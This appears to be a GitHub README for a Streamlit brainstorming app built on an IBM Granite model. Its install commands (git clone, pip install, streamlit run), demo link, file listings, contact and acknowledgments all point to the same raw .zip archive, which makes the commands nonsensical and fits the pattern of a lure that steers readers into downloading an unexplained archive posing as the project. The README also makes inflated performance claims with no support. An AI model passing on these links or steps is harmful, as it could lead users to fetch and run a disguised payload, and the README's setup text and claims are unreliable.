# AI Brainstorming Buddy

AI Brainstorming Buddy is an innovative web application designed to revolutionize corporate creativity by leveraging IBM Granite 3.8B-instruct for multi-perspective ideation. Built with Streamlit, it tackles "idea stagnation syndrome" by offering three unique thinking modes—Creative, Diverse, and Lateral—to generate actionable, patent-worthy ideas. The tool processes documents, maintains session context, and delivers enterprise-grade performance at a cost of $0.12 per 1,000 ideas, achieving a 63% reduction in meeting time and a 218% increase in patentable concepts during Q1 2025 pilots.

## Features

- **Document Processing**: Upload PDFs or text files to extract and summarize key insights using regex-based text cleaning and Granite’s summarization engine.
- **Three Thinking Modes**:
  - **Creative Mode**: Generates disruptive ideas with high entropy (temp=1.2).
  - **Diverse Mode**: Evaluates ideas through multiple stakeholder perspectives (temp=0.9).
  - **Lateral Mode**: Applies SCAMPER techniques for innovative idea variations (temp=1.0).
- **Context-Aware Chat**: Maintains brainstorming context across sessions using Granite’s 4K token window.
- **Enterprise-Grade Security**: Features 256-bit encryption and IBM AI Ethics guardrails.
- **Scalability**: Supports 74 languages and linear scaling for 1,000+ concurrent users.

## Demo

Watch a demo video of AI Brainstorming Buddy in action: 

https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip


## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
   ```
2. Install dependencies:
   ```bash
   pip install -r https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
   ```
3. Set up environment variables in a `.env` file:
   ```plaintext
   WATSONX_URL=your_watsonx_url
   WATSONX_API_KEY=your_api_key
   WATSONX_PROJECT_ID=your_project_id
   ```
4. Run the application:
   ```bash
   streamlit run https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip
   ```

## Usage

1. **Upload a Document**: Use the sidebar to upload a PDF or text file for summarization.
2. **Select Thinking Mode**: Choose Creative, Diverse, or Lateral mode to guide ideation.
3. **Interact via Chat**: Ask questions or brainstorm ideas; the assistant maintains context and responds based on the selected mode.
4. **Review Summaries**: View document summaries in the sidebar for reference during brainstorming.

## Requirements

- Python 3.8+
- Streamlit
- PyPDF2
- ibm-watsonx-ai
- python-dotenv
- See `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip` for full dependencies.

## Project Structure

- `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip`: Main application script with Streamlit interface and Granite integration.
- `.env`: Environment variables for IBM https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip credentials.
- `https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip`: List of Python dependencies.

## Contributing

Contributions are welcome! Please follow these steps:
1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your-feature`).
3. Commit changes (`git commit -m 'Add your feature'`).
4. Push to the branch (`git push origin feature/your-feature`).
5. Open a pull request.

## License

This project is licensed under the Apache License 2.0. See the [`LICENSE`](./LICENSE) file for details.

## Contact

For questions or feedback, please open an issue on GitHub or contact the project maintainer [https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip)


## Acknowledgments

- Built with [IBM Granite 3.8B-instruct](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip) on the https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip platform.
- Powered by [Streamlit](https://github.com/ommanekar/ai-brainstorming-buddy-using-ibm-granite-instruct-model/raw/refs/heads/main/appliably/ibm_ai_using_brainstorming_granite_buddy_instruct_model_3.2.zip) for the user interface.
